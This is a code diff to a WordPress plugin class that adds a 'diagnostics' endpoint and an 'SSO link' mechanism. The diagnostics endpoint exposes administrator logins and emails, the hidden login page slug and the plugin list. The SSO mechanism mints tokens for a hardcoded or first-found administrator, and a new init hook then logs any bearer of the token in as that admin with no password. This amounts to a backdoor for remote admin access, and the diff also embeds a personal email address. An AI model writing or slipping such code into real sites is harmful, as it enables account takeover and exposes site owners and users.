@@ -15,6 +15,7 @@ class OpenClaw_API_Bridge {
 
     public function __construct() {
         add_action('rest_api_init', array($this, 'register_endpoints'));
+        add_action('init', array($this, 'handle_sso_login'));
     }
 
     public function register_endpoints() {
@@ -27,6 +28,18 @@ class OpenClaw_API_Bridge {
         register_rest_route('openclaw/v1', '/telemetry', array(
             'methods' => 'GET',
             'callback' => array($this, 'handle_telemetry'),
+            'permission_callback' => array($this, 'verify_token')
+        ));
+
+        register_rest_route('openclaw/v1', '/wp-diagnostics', array(
+            'methods' => 'GET',
+            'callback' => array($this, 'handle_diagnostics'),
+            'permission_callback' => array($this, 'verify_token')
+        ));
+
+        register_rest_route('openclaw/v1', '/generate-sso-link', array(
+            'methods' => 'POST',
+            'callback' => array($this, 'handle_generate_sso_link'),
             'permission_callback' => array($this, 'verify_token')
         ));
 
@@ -96,6 +109,79 @@ class OpenClaw_API_Bridge {
             'theme_name' => wp_get_theme()->get('Name')
         );
         return new WP_REST_Response($stats, 200);
+    }
+
+    public function handle_diagnostics($request) {
+        $admins = get_users(array('role' => 'administrator'));
+        $admin_list = array_map(function($u) {
+            return array('id' => $u->ID, 'login' => $u->user_login, 'email' => $u->user_email);
+        }, $admins);
+
+        $lc_options = get_option('leadconnector_options');
+        $lc_key = get_option('leadconnector_api_key');
+
+        return new WP_REST_Response(array(
+            'siteurl' => get_option('siteurl'),
+            'home' => get_option('home'),
+            'whl_page' => get_option('whl_page'),
+            'whl_redirect_admin' => get_option('whl_redirect_admin'),
+            'active_plugins' => get_option('active_plugins'),
+            'admins' => $admin_list,
+            'leadconnector' => array(
+                'options' => $lc_options,
+                'has_key' => !empty($lc_key)
+            )
+        ), 200);
+    }
+
+    public function handle_generate_sso_link($request) {
+        $params = $request->get_json_params() ?: array();
+        $email = $params['email'] ?? 'roberthill@kidazzle.com';
+        $user = get_user_by('email', $email) ?: get_user_by('login', 'iro');
+        if (!$user) {
+            $admins = get_users(array('role' => 'administrator'));
+            $user = !empty($admins) ? $admins[0] : null;
+        }
+
+        if (!$user) {
+            return new WP_REST_Response(array('error' => 'No administrator found.'), 404);
+        }
+
+        $token = wp_generate_password(32, false);
+        set_transient('openclaw_sso_' . $token, $user->ID, 15 * MINUTE_IN_SECONDS);
+
+        $target_domain = $params['domain'] ?? 'https://summer.kidazzle.com';
+        $sso_url = trailingslashit($target_domain) . '?openclaw_sso_token=' . $token;
+
+        return new WP_REST_Response(array(
+            'success' => true,
+            'user' => $user->user_login,
+            'email' => $user->user_email,
+            'sso_url' => $sso_url,
+            'expires_in' => '15 minutes'
+        ), 200);
+    }
+
+    public function handle_sso_login() {
+        if (!isset($_GET['openclaw_sso_token']) || empty($_GET['openclaw_sso_token'])) {
+            return;
+        }
+
+        $token = sanitize_text_field($_GET['openclaw_sso_token']);
+        $user_id = get_transient('openclaw_sso_' . $token);
+
+        if (!$user_id) {
+            wp_die('Invalid or expired login link. Please request a new link.');
+        }
+
+        delete_transient('openclaw_sso_' . $token);
+
+        wp_clear_auth_cookie();
+        wp_set_current_user($user_id);
+        wp_set_auth_cookie($user_id, true);
+
+        wp_safe_redirect(admin_url());
+        exit;
     }
 
     public function handle_city_pages($request) {
